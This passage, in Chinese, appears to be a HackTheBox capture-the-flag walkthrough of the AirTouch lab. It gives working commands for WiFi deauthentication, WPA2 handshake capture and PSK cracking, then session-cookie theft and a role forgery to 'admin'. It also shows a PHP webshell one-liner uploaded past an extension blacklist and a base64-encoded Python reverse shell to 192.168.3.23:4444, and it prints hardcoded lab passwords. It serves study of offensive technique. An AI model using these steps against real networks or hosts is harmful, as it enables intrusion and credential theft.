                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD180050F2020101010003A4000027F7000043FF5E0067FF2F00
          Cell 07 - Address: AC:8B:A9:AA:3F:D2
                    Channel:44
                    Frequency:5.22 GHz (Channel 44)
                    Quality=70/70  Signal level=-30 dBm  
                    Encryption key:on
                    ESSID:"AirTouch-Office"
                    Bit Rates:6 Mb/s; 9 Mb/s; 12 Mb/s; 18 Mb/s; 24 Mb/s
                              36 Mb/s; 48 Mb/s; 54 Mb/s
                    Mode:Master
                    Extra:tsf=00065125dbc9ebb0
                    Extra: Last beacon: 92ms ago
                    IE: Unknown: 000F416972546F7563682D4F6666696365
                    IE: Unknown: 01088C129824B048606C
                    IE: Unknown: 03012C
                    IE: Unknown: 070A45532024041795060D00
                    IE: IEEE 802.11i/WPA2 Version 1
                        Group Cipher : CCMP
                        Pairwise Ciphers (1) : CCMP
                        Authentication Suites (1) : 802.1x
                    IE: Unknown: 3B027300
                    IE: Unknown: 7F080400400200000040
                    IE: Unknown: DD180050F2020101010003A4000027F7000043FF5E0067FF2F00
```

输出很长，但是我们只需要关注几个关键的信息：Address、Channel、ESSID、Authentication Suites

> 由于 Frequency 中也带了 Channel，直接过滤 Channel 的话会把 Frequency 带上，这回导致信息有一定的冗余，因此采用“直接过滤 Frequency”。

做个过滤即可：

```bash
root@AirTouch-Consultant:~/eaphammer# iwlist wlan0 scan | grep -e Address -e Frequency -e ESSID -e "Authentication Suites"
          Cell 01 - Address: CE:B4:5D:7E:F4:F9
                    Frequency:2.412 GHz (Channel 1)
                    ESSID:"vodafoneFB6N"
                        Authentication Suites (1) : PSK
          Cell 02 - Address: C6:29:4F:5B:3D:47
                    Frequency:2.422 GHz (Channel 3)
                    ESSID:"MOVISTAR_FG68"
                        Authentication Suites (1) : PSK
          Cell 03 - Address: 1E:2D:24:1C:10:C1
                    Frequency:2.437 GHz (Channel 6)
                    ESSID:"WIFI-JOHN"
                        Authentication Suites (1) : PSK
          Cell 04 - Address: F0:9F:C2:A3:F1:A7
                    Frequency:2.437 GHz (Channel 6)
                    ESSID:"AirTouch-Internet"
                        Authentication Suites (1) : PSK
          Cell 05 - Address: EA:67:C7:27:13:7C
                    Frequency:2.452 GHz (Channel 9)
                    ESSID:"MiFibra-24-D4VY"
                        Authentication Suites (1) : PSK
          Cell 06 - Address: AC:8B:A9:F3:A1:13
                    Frequency:5.22 GHz (Channel 44)
                    ESSID:"AirTouch-Office"
                        Authentication Suites (1) : 802.1x
          Cell 07 - Address: AC:8B:A9:AA:3F:D2
                    Frequency:5.22 GHz (Channel 44)
                    ESSID:"AirTouch-Office"
                        Authentication Suites (1) : 802.1x
```

"AirTouch-Internet"、"AirTouch-Office"，这两个 WiFi 名称在拓扑中出现，因此需要格外关注 Cell 04、Cell 06 和 Cell 07：

```bash
Cell 04 - Address: F0:9F:C2:A3:F1:A7
		Frequency:2.437 GHz (Channel 6)
		ESSID:"AirTouch-Internet"
			Authentication Suites (1) : PSK
Cell 06 - Address: AC:8B:A9:F3:A1:13
		Frequency:5.22 GHz (Channel 44)
		ESSID:"AirTouch-Office"
			Authentication Suites (1) : 802.1x
Cell 07 - Address: AC:8B:A9:AA:3F:D2
		Frequency:5.22 GHz (Channel 44)
		ESSID:"AirTouch-Office"
			Authentication Suites (1) : 802.1x
```

### 2、监听无线流量

通过 wlan0，来监听能监听到的无线网络流量。

要实现这点，先得让该无线网口开启监听模式：

```bash
root@AirTouch-Consultant:~/eaphammer# airmon-ng start wlan0
Your kernel has module support but you don't have modprobe installed.
It is highly recommended to install modprobe (typically from kmod).
Your kernel has module support but you don't have modinfo installed.
It is highly recommended to install modinfo (typically from kmod).
Warning: driver detection without modinfo may yield inaccurate results.


PHY	Interface	Driver		Chipset

phy0	wlan0		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211

		(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
		(mac80211 station mode vif disabled for [phy0]wlan0)
phy1	wlan1		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy2	wlan2		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy3	wlan3		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy4	wlan4		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy5	wlan5		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
phy6	wlan6		mac80211_hwsim	Software simulator of 802.11 radio(s) for mac80211
```

> 普通无线网卡默认是 **managed mode**，只能连接 AP 并收发与自己相关的数据包，而 **monitor mode** 可以监听空气中经过的 802.11 无线帧。

开启后能看到原本的 wlan0 变成了 wlan0mon，即开启了监听模式：

```bash
root@AirTouch-Consultant:~/eaphammer# ip addr show wlan0mon
3: wlan0mon: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UNKNOWN group default qlen 1000
    link/ieee802.11/radiotap 02:00:00:00:00:00 brd ff:ff:ff:ff:ff:ff
```

为了输出的简洁和精准，我们通过参数指定捕获通道 6 中的 AirTouch-Internet 无线流量：

```bash
airodump-ng wlan0mon --channel 6 --bssid F0:9F:C2:A3:F1:A7
```

```bash
 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 F0:9F:C2:A3:F1:A7  -28 100      322       14    0   6   54        CCMP   PSK  AirTouch-Internet                                                                                            

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 F0:9F:C2:A3:F1:A7  28:6C:07:FE:A3:22  -29   54 -54      0       15         AirTouch-Internet
```

上半部分是 AP（接入点，即认证方），下半部分是 STA（Station，即客户端）。

先看上半部分，就是我们之前看到的无线局域网 AirTouch-Internet（ESSID）：

- BSSID：AP 的 MAC 地址
- PWR：表示信号强度，-28 表示信号非常好
- RXQ：表示接受质量（通常范围为 0-100），这里显示 100，说明接收质量非常好（基本没有丢包的现象）
- CIPHER：表示加密套件，这里显示的是 CCMP（见后续解释）
- AUTH：表示 WPA2 的认证模式为 PSK（见后续解释）

再看下半部分：

- BSSID：表示客户端连接的是哪个无线局域网
- STATION：表示客户端的 MAC 地址
- PWR 很强
- Lost 0 表示零丢包
- Frames：表示从这个客户端捕获的帧数量（这个取决于你监听了多久）

### 3、Deauth + 抓 4-way Handshake

根据：

- 认证方式为 PSK
- 存在客户端连接
- 能抓到数据帧，说明有通信
- 信号强度和质量都很好

首先，WPA2-PSK 只要抓到 4 次握手包（理论上前两次即可），就可以离线破解 PSK（简单来说，就是 WiFi 密码）。

- 目的：获取 4 次握手包
- 已有信息：有客户端连接，且有通信

可以想到 Deauth 攻击。

#### （1）Deauth 攻击

无线客户端和 AP 之间会使用一些管理帧维护连接状态，例如：

- Authentication
- Association
- Deauthentication
- Disassociation

其中，Deauthentication 帧表示“断开认证关系”，这是 Deauth 攻击的核心。

当 AP 向客户端发送 Deauth 帧，也就是告诉客户端：“你已经被取消认证，请断开连接”。

在 WPA2 网络中，Deauthentication 帧默认没有加密和认证保护。换言之，客户端不会验证谁给他发送的此帧，只要收到了，就会根据该帧的功能执行相应的操作。

在 Deauth 攻击中，攻击者通过伪造 AP 的 MAC 地址，向客户端发送伪造的 Deauth 帧，迫使客户端进行自动重连操作。

有重连即有新的 4 次握手，只要攻击者一直在监听流量，就可以捕获到这一过程。

该攻击需要用到两个终端。

先开启流量监听：

```bash
airodump-ng wlan0mon --channel 6 --bssid F0:9F:C2:A3:F1:A7 -w /tmp/airtouch_internet
```

再开一个终端，登上 consultant 账户，并切换到 root 用户，执行 Deauth 攻击：

```bash
aireplay-ng --deauth 15 -a F0:9F:C2:A3:F1:A7 -c 28:6C:07:FE:A3:22 wlan0mon
```

部分命令解释：

- `--deauth 15`：发送 15 个 Deauthentication 帧
- `-a F0:9F:C2:A3:F1:A7`：指定目标 AP 的 BSSID（攻击哪个 AP）
- `-c 28:6C:07:FE:A3:22`：指定目标客户端的 MAC 地址（攻击哪个客户端）

当成功获取四次握手之后，监听窗口会出现下述内容：

![[file-20260507142844259.png]]

按两次 `q` 之后，就能退出监听，由于我们用了 `-w` 参数，在指定目录下会生成对应的流量包：

```bash
root@AirTouch-Consultant:~/eaphammer# ls /tmp | grep ai
airtouch_internet-01.cap
airtouch_internet-01.csv
airtouch_internet-01.kismet.csv
airtouch_internet-01.kismet.netxml
airtouch_internet-01.log.csv
```

下载到本地：

```bash
zyf@kali:~/htb % scp consultant@10.129.244.98:/tmp/airtouch_internet-01.cap ./
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
consultant@10.129.244.98's password: 
airtouch_internet-01.cap                                                                                                                                   100%  166KB 333.8KB/s   00:00
```

用 WireShark 打开，因为握手的过程采用的是 EAPOL-Key 帧进行传输（特殊的 802.1X 帧），可以通过：

```
eapol
```

进行过滤。

可以看到四次握手的过程全都被我们截到了：

![[file-20260507170213647.png]]

#### （2）WPA2 四次握手

为了方便后续理解本地破解 PSK 的原因，这里有必要了解 WPA2 四次握手。

避免糊涂，这里列出关键术语列表：

- PSK：你输入的 Wi-Fi 密码
- PMK：Pairwise Master Key，成对主密钥
- PTK：Pairwise Transient Key，成对临时密钥
- GTK：Group Temporal Key，组临时密钥（用于广播/组播帧）
- ANonce：AP 生成的一次性随机数（256 位）
- SNonce：STA 生成的一次性随机数（256 位）
- MIC：Message Integrity Code，消息完整性校验码

在握手开始前，AP 和客户端都是知道 PSK 的，在本地就会计算出 PMK：

```
PMK = PBKDF2-HMAC-SHA1(PSK, SSID, 4096, 256)
```

第一次握手，AP 以明文的形式向客户端发送 ANonce（存放于 Key Nonce 中）：

![[file-20260507145614090.png]]

![[file-20260507151512773.png]]

客户端收到后，先生成一个随机值 SNonce，接着在本地计算出 PTK：

```
PTK = PRF-384(PMK, "Pairwise key expansion",
              Min(AA, SPA) || Max(AA, SPA) ||
              Min(ANonce, SNonce) || Max(ANonce, SNonce))
```

> 其中的 AA 代表 AP 的 MAC 地址，SPA 代表客户端的 MAC 地址。

PTK 在加密套件为 CCMP 的情况下，会被分成三段：

|子密钥|字节范围|长度|用途|
|---|---|---|---|
|KCK (Key Confirmation Key)|0–15|128 位|计算握手帧的 MIC（消息完整性校验）|
|KEK (Key Encryption Key)|16–31|128 位|加密握手帧中传输的 GTK（用 AES Key Wrap）|
|TK (Temporal Key)|32–47|128 位|真正加密数据帧的密钥（给 AES-CCMP 用）|

此时用到第一段 KCK，利用该子密钥计算得到 MIC（用于验证）：

![[file-20260507151922195.png]]

客户端将 SNonce 和 MIC 发送给 AP：

![[file-20260507152432874.png]]

![[file-20260507152550248.png]]

此时完成了第二次握手。

AP 收到信息后，在本地用同样的公式计算出 PTK 和 MIC，此时只需要验证：

```
客户端_MIC ?= 本地算出的_MIC
```

即可验证客户端是否真的知道 PSK。

验证失败则静默丢弃，握手失败；验证成功则开始第三次握手：

AP 此时将 GTK 以加密的方式进行传播，加密的密钥就是 PTK 的第二个部分 KEK：

![[file-20260507154246876.png]]

![[file-20260507153626974.png]]

客户端收到后，通过 KEK 解密数据，恢复 GTK，此时客户端就有了：

- GTK：用于加/解密广播流量
- TK：用于加/解密 AP 与 客户端之间的点对点流量

此时，第四次握手，AP 发送一个确认，并且在本地开启 802.1X Controlled Port，今后都用这个端口进行传输数据。

![[file-20260507170354451.png]]

#### （3）本地破解 PSK

通过上述对四次握手的讲解，我们可以发现“前两次握手是以明文形式交互的”，并且其中交互了 MIC 这个信息，MIC 又是通过 PTK 得到的，再来回顾一下它的计算公式：

```
PMK = PBKDF2-HMAC-SHA1(PSK, SSID, 4096, 256)

PTK = PRF-384(PMK, "Pairwise key expansion",
              Min(AA, SPA) || Max(AA, SPA) ||
              Min(ANonce, SNonce) || Max(ANonce, SNonce))
```

我们只需要知道：

- PSK
- SSID
- AA
- SPA
- ANonce
- SNonce

即可计算得到 MIC。

而 MIC 就在第二次握手帧中，整个计算式的自变量只有一个未知数，那就是 PSK，黑盒化一下方程就是：

```
MIC = f(PSK)
```

我们可以通过本地爆破 PSK 计算对应的 MIC，然后比较计算结果和捕获到的是否一致：

- 一致：PSK 正确
- 不一致：下一个

开始暴力破解：

```bash
zyf@kali:~/htb % aircrack-ng -w /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt ./airtouch_internet-01.cap 
Reading packets, please wait...
Opening ./airtouch_internet-01.cap
Resetting EAPOL Handshake decoder state.
Read 3901 packets.

   #  BSSID              ESSID                     Encryption

   1  F0:9F:C2:A3:F1:A7  AirTouch-Internet         WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening ./airtouch_internet-01.cap
Resetting EAPOL Handshake decoder state.
Read 3901 packets.

1 potential targets



                               Aircrack-ng 1.7 

      [00:00:01] 29477/10303727 keys tested (29242.47 k/s) 

      Time left: 5 minutes, 51 seconds                           0.29%

                           KEY FOUND! [ challenge ]


      Master Key     : D1 FF 70 2D CB 11 82 EE C9 E1 89 E1 69 35 55 A0 
                       07 DC 1B 21 BE 35 8E 02 B8 75 74 49 7D CF 01 7E 

      Transient Key  : 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 
                       00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 

      EAPOL HMAC     : F4 02 49 A6 52 B4 2B FB 09 83 6C 43 58 0F D9 32 
```

成功得到 PSK 为：challenge

#### （4）登入 AP

将 Consultant Laptop 这台机子接入 AirTouch-Internet。

首先生成连接所需要的配置文件：

```bash
root@AirTouch-Consultant:~/eaphammer# wpa_passphrase AirTouch-Internet challenge > /tmp/airtouch-internet.conf
```

> `wpa_supplicant` 需要从配置文件读取连接参数。

配置文件中的内容：

```bash
root@AirTouch-Consultant:~/eaphammer# cat /tmp/airtouch-internet.conf
network={
	ssid="AirTouch-Internet"
	#psk="challenge"
	psk=d1ff702dcb1182eec9e189e1693555a007dc1b21be358e02b87574497dcf017e
}
```

> 注意这里不要混淆，之前为了讲解方便，将 PSK 与 WiFi 密码当作同一个，但其实并不是。明文密码 `challenge` 会结合 SSID 通过 PBKDF2 派生出 256-bit PSK/PMK。

指定另一个无线网口（非 wlan0，因为已经启用监听模式）用于连接该 AP：

```bash
root@AirTouch-Consultant:~/eaphammer# wpa_supplicant -B -i wlan1 -c /tmp/airtouch-internet.conf
Successfully initialized wpa_supplicant
rfkill: Cannot open RFKILL control device
rfkill: Cannot get wiphy information 
```

连接之后，通过 DHCP 请求网络设置：

```bash
root@AirTouch-Consultant:~/eaphammer# dhclient -v wlan1
Internet Systems Consortium DHCP Client 4.4.1
Copyright 2004-2018 Internet Systems Consortium.
All rights reserved.
For info, please visit https://www.isc.org/software/dhcp/

Listening on LPF/wlan1/02:00:00:00:01:00
Sending on   LPF/wlan1/02:00:00:00:01:00
Sending on   Socket/fallback
DHCPDISCOVER on wlan1 to 255.255.255.255 port 67 interval 3 (xid=0x513f170e)
DHCPDISCOVER on wlan1 to 255.255.255.255 port 67 interval 5 (xid=0x513f170e)
DHCPOFFER of 192.168.3.23 from 192.168.3.1
DHCPREQUEST for 192.168.3.23 on wlan1 to 255.255.255.255 port 67 (xid=0xe173f51)
DHCPACK of 192.168.3.23 from 192.168.3.1 (xid=0x513f170e)
bound to 192.168.3.23 -- renewal in 34426 seconds.
root@AirTouch-Consultant:~/eaphammer# ip addr show wlan1
8: wlan1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 02:00:00:00:01:00 brd ff:ff:ff:ff:ff:ff
    inet 192.168.3.23/24 brd 192.168.3.255 scope global dynamic wlan1
       valid_lft 86393sec preferred_lft 86393sec
    inet6 fe80::ff:fe00:100/64 scope link 
       valid_lft forever preferred_lft forever
```

获得 IP 地址为 `192.168.3.23`。

#### （5）内网扫描

查看路由信息：

```bash
root@AirTouch-Consultant:~/eaphammer# ip route show
default via 172.20.1.1 dev eth0 
172.20.1.0/24 dev eth0 proto kernel scope link src 172.20.1.2 
192.168.3.0/24 dev wlan1 proto kernel scope link src 192.168.3.23
```

对于 `192.168.3.0/24` 是直连的（scope link）。

直接对内网进行扫描，在主机上自带了 nmap：

```bash
root@AirTouch-Consultant:~/eaphammer# which nmap
/usr/bin/nmap
```

```bash
root@AirTouch-Consultant:~/eaphammer# nmap -sn -PR -n 192.168.3.0/24
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-07 09:56 UTC
Nmap scan report for 192.168.3.1
Host is up (0.00029s latency).
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)
Nmap scan report for 192.168.3.23
Host is up.
Nmap done: 256 IP addresses (2 hosts up) scanned in 2.04 seconds
```

发现了新的主机 `192.168.3.1`，而且根据扫描得到的 MAC 地址（`F0:9F:C2:A3:F1:A7`），可以确认这台主机就是 Tablets Vlan 中的那台无线路由器。

进行 TCP 全端口扫描：

```bash
root@AirTouch-Consultant:~/eaphammer# nmap -p- --min-rate 10000 192.168.3.1
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-07 10:01 UTC
Nmap scan report for 192.168.3.1
Host is up (0.000016s latency).
Not shown: 65532 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
53/tcp open  domain
80/tcp open  http
MAC Address: F0:9F:C2:A3:F1:A7 (Ubiquiti Networks)
```

发现开放了 80 端口，先建立一个 socks5 代理，方便本地通过浏览器访问目标：

```bash
zyf@kali:~/htb % ssh -D 0.0.0.0:1080 -N -C consultant@10.129.244.98
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
```

Burp 中配置代理信息：

![[file-20260507180420414.png]]

这样之后，Burp 内置浏览器就可以直接访问 `http://192.168.3.1` 了。

## 四、192.168.3.1 80 端口

是一个登入界面：

![[file-20260507180521010.png]]

大家应该还记得我们之前抓取过该无线局域网的无线流量，其中就有客户端和 AP 之间的交互。那么，其中的交互是否涉及到 http 服务的访问呢？

再次打开该流量包，由于我们知道了 PSK 的信息，就可以解密握手之后的加密通信，在 WireShark 中可以这样配置：

菜单栏：编辑 → 首选项 → Protocols → IEEE 802.11：

![[file-20260507194015936.png]]

在弹出的对话框中添加一个新条目：

![[file-20260507194100824.png]]

为什么选择 wpa-pwd 呢？

因为该形势下，key 只需要填写“明文密码:SSID”，即 `challenge:AirTouch-Internet`，比较方便。

如果选择的是 wpa-psk 的话，就需要将之前生成连接配置文件中的 PSK 拿出来了（`d1ff702dcb1182eec9e189e1693555a007dc1b21be358e02b87574497dcf017e`）。

配置完成后，直接过滤 http 协议：

![[file-20260507194705305.png]]

追踪数据流：

![[file-20260507194731943.png]]

就可以看到 http 数据包：

```http
GET /lab.php HTTP/1.1
Host: 192.168.3.1
User-Agent: curl/7.88.1
Accept: */*
Cookie: PHPSESSID=l261v32n28s97all51ghec5m6e; UserRole=user

HTTP/1.1 200 OK
Date: Thu, 07 May 2026 06:28:34 GMT
Server: Apache/2.4.41 (Ubuntu)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 323
Content-Type: text/html; charset=UTF-8



<!DOCTYPE html>
<html>

<head>
    <title>WiFi Router Configuration</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>

Welcome manager<br><br><br><br>
Congratulation! You have logged into password protected page. <a href="index.php">Click here</a> to go to index.php to get the flag. 

</body>

</html>
```

这里暴露了一个信息，就是：

```http
Cookie: PHPSESSID=l261v32n28s97all51ghec5m6e; UserRole=user
```

响应正文中出现了 “flag” 字样。

尝试盗用 Cookie，伪装成登入过的合法用户去访问：

```bash
root@AirTouch-Consultant:~/eaphammer# curl http://192.168.3.1 -b "PHPSESSID=l261v32n28s97all51ghec5m6e; UserRole=user" 

<!DOCTYPE html>
<html>

<head>
    <title>WiFi Router Configuration</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>


    <script>
        const editNetworkNameBtn = document.getElementById('edit-network-name');
        const editPasswordBtn = document.getElementById('edit-password');
        const editSecurityModeBtn = document.getElementById('edit-security-mode');

        document.getElementById("network-name").value = "wifi-name";

        editNetworkNameBtn.addEventListener('click', () => {
            const networkNameInput = document.getElementById('network-name');
            networkNameInput.disabled = !networkNameInput.disabled;
            // Optionally, enable and show an update button
        });

        // Similar logic for other edit buttons

        // Implement validation and update logic using JavaScript and appropriate security measures

    </script>

    <div class="menu">
        <h3>Hello, manager (user)!</h3>        <h2>WiFi Settings</h2>
        <ul>
            <li>
                <a href="#">Network Name</a>
                <div class="network-name-options">
                    <input type="text" id="network-name" value="wifi-mobiles" disabled>
                    <span class="info">Current: <span id="current-network-name"></span></span>
                    <button type="button" id="edit-network-name" disabled>Edit</button>
                </div>
            </li>
            <li>
                <a href="#">Password</a>
                <div class="password-options">
                    <input type="password" id="password" value="********" disabled>
                    <span class="info">Hidden for security</span>
                    <button type="button" id="edit-password" disabled>Edit</button>
                </div>
            </li>
            <li>
                <a href="#">Security Mode</a>
                <div class="security-mode-options">
                    <select id="security-mode" disabled>
                        <option value="WPA2-PSK">WPA2-PSK</option>
                        <option value="WPA-PSK">WPA-PSK</option>
                    </select>
                    <span class="info">Current: <span id="current-security-mode"></span></span>
                    <button type="button" id="edit-security-mode" disabled>Edit</button>
                </div>
            </li>
        </ul>

    </div>
    <div class="content">
        
        
    </div>
    <script src="script.js"></script>

    <!-- Button to logout -->
    <div style="text-align:center;">
        <button style="width: 20%;align-items: center;" type="button" id="logout-button">Logout</button>
    </div>

    <script>
        // Add event listener to the logout button
        document.getElementById("logout-button").addEventListener("click", function () {
            // Redirect to logout.php upon clicking the button
            window.location.href = "logout.phtml";
        });
    </script>


</body>
```

发现响应正文并不是登入界面，看来绕过登入了。

但是并没有根它说的那样，看到 flag 的信息，仔细看 Cookie 中的第二个键值对：

```
UserRole=user
```

我们是不是可以将其改为：

```
UserRole=admin
```

如果后端真的以此作为判断“是否为管理员”的依据，我们就可以以管理员界面来操作这个系统了，尝试：

```bash
root@AirTouch-Consultant:~/eaphcurl http://192.168.3.1/index.php -b "PHPSESSID=l261v32n28s97all51ghec5m6e; UserRole=admin" | grep "Hello, manager"
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3234  100  3234    0     0  1052k      0 --:--:-- --:--:-- --:--:-- 1052k
        <h3>Hello, manager (admin)!</h3>        <h2>WiFi Settings</h2>
```

确实和我们想的一样。

为了操作方便，我们在 Burp 中设置：

![[file-20260507195831345.png]]

![[file-20260507195927617.png]]

![[file-20260507200103708.png]]

![[file-20260507200133723.png]]

添加完成后，去 Scope 面板，将 Proxy 添加上：

![[file-20260507201231371.png]]

> 注意“Include all URLS”这个选项在靶场中无所谓，但是在实际测试中要选择对目标才生效 rule 的选项，以免打偏。

上述配置完成之后，我们之后在 Burp 默认浏览器中访问目标站点都会自动添加自定义的 Cookie：

```http
Cookie: PHPSESSID=l261v32n28s97all51ghec5m6e; UserRole=admin
```

查看管理员界面后，发现只有文件上传的功能是可用的：

![[file-20260507200552366.png]]

尝试随意上传一个文件：

![[file-20260507201457230.png]]

会显示文件已经上传到 `uploads` 目录下，访问看看：

![[file-20260507201559280.png]]

确实能访问到。

之前看到的登入界面是 `login.php`，目标后端用的是 php 语言，可以尝试上传 Webshell，本地准备一个 `shell.php` 文件，写入一句话木马：

```php
<?php @eval(system($_REQUEST['cmd']));?>
```

上传之后提示：

![[file-20260507201905057.png]]

根据描述，很可能是黑名单显示，尝试改后缀上传，将 `shell.php` 改为 `shell.phtml`：

```bash
zyf@kali:~/htb % mv shell.php shell.phtml
```

再次上传：

![[file-20260507202032398.png]]

上传成功，测试 Webshell：

```bash
root@AirTouch-Consultant:~/eaphammer# curl http://192.168.3.1/uploads/shell.phtml?cmd=whoami
www-data
```

成功。

## 五、www-data shell

### 1、反弹 Shell

尝试反弹 shell，在网站：

```
https://www.revshells.com/
```

上生成对应的反弹 shell 代码。

先探测一下目标是否存在 Python 环境：

```bash
root@AirTouch-Consultant:~/eaphammer# curl http://192.168.3.1/uploads/shell.phtml --data-urlencode "cmd=python3 --version"
Python 3.8.10
```

发现有 Python，选择的反弹 Shell 代码：

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.3.23",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

统一一下里面的单双引号：

```bash
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.3.23',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('sh')
```

将其转换成 Base64 编码：

```bash
root@AirTouch-Consultant:~/eaphammer# echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('192.168.3.23',4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn('sh')" | base64 -w0
aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzE5Mi4xNjguMy4yMycsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oJ3NoJykK
```

本地开启监听：

```bash
root@AirTouch-Consultant:~/eaphammer# nc -lvnp 4444
Listening on 0.0.0.0 4444
```

RCE 执行反弹 shell 命令：

```bash
root@AirTouch-Consultant:~/eaphammer# curl http://192.168.3.1/uploads/shell.phtml --data-urlencode "cmd=echo aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoJzE5Mi4xNjguMy4yMycsNDQ0NCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oJ3NoJykK | base64 -d | python3"
```

发现反弹成功了：

```
$ whoami
whoami
www-data
```

进行 Shell 的稳定化操作：

首先生成 PTY（伪终端）：

```bash
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@AirTouch-AP-PSK:/var/www/html/uploads$
```

接着设置 TERM 环境变量：

```bash
www-data@AirTouch-AP-PSK:/var/www/html/uploads$ export TERM=xterm
export TERM=xterm
```

最后按“Ctrl + z”将此 shell 挂到后台，并在本地上执行：

```bash
root@AirTouch-Consultant:~/eaphammer# stty raw -echo; fg
```

如此一来，就得到了一个相对稳定的 shell：

- Tab 自动补全
- 方向键历史
- Ctrl+C 安全（只杀 Shell 内的命令，不杀 Shell 本身）
- 能跑 `vim/nano/ssh`

### 2、信息搜集

```bash
www-data@AirTouch-AP-PSK:/$ ls /home/user/ -la
total 24
drwxr-xr-x 1 user user 4096 Jan 13 14:55 .
drwxr-xr-x 1 root root 4096 Jan 13 14:55 ..
lrwxrwxrwx 1 user user    9 Nov 24  2024 .bash_history -> /dev/null
-rw-r--r-- 1 user user  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 user user 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 user user  807 Feb 25  2020 .profile
```

在用户目录下并没有找到 user.txt，可能需要提权才能找到 flag。

查看当前用户的 `sudo` 权限： 

```bash
www-data@AirTouch-AP-PSK:/var/www/html$ sudo -l
[sudo] password for www-data:
```

提示要输入 `www-data` 的密码，很明显我们是不知道的。

其他常规目录看不出什么信息。

`www-data` 是 Web 服务背后的低权限用户，可能提示突破口在 Web 相关源文件这里。

在 Web 根目录下，能看到我们之前访问的网站背后的源码信息：

```bash
www-data@AirTouch-AP-PSK:/var/www/html$ ls -la 
total 44
drwxr-xr-x 1 www-data www-data 4096 Jan 13 14:55 .
drwxr-xr-x 1 root     root     4096 Jan 13 14:55 ..
-rw-r--r-- 1 www-data www-data 5556 Mar 27  2024 index.php
-rw-r--r-- 1 www-data www-data  512 Mar 27  2024 lab.php
-rw-r--r-- 1 www-data www-data 2542 Mar 27  2024 login.php
-rw-r--r-- 1 www-data www-data 1023 Mar 27  2024 logout.phtml
-rw-r--r-- 1 www-data www-data 1325 Mar 27  2024 style.css
drwxr-xr-x 1 www-data www-data 4096 May  7 12:20 uploads
```

由于我们是通过盗用 Cookie 并伪造了 Cookie 字段才登入的管理员界面，可以查看一下 `Login.php` 中的相关逻辑：

```php
<?php session_start(); /* Starts the session */

// Check if user is already logged in
if (isset($_SESSION['UserData']['Username'])) {
  header("Location:index.php"); // Redirect to index.php
  exit; // Make sure to exit after redirection
}

session_start();


if (isset($_POST['Submit'])) {
  /* Define username, associated password, and user attribute array */
  $logins = array(
    /*'user' => array('password' => 'JunDRDZKHDnpkpDDvay', 'role' => 'admin'),*/
    'manager' => array('password' => '2wLFYNh4TSTgA5sNgT4', 'role' => 'user')
  );

  /* Check and assign submitted Username and Password to new variable */
  $Username = isset($_POST['Username']) ? $_POST['Username'] : '';
  $Password = isset($_POST['Password']) ? $_POST['Password'] : '';

  /* Check Username and Password existence in defined array */
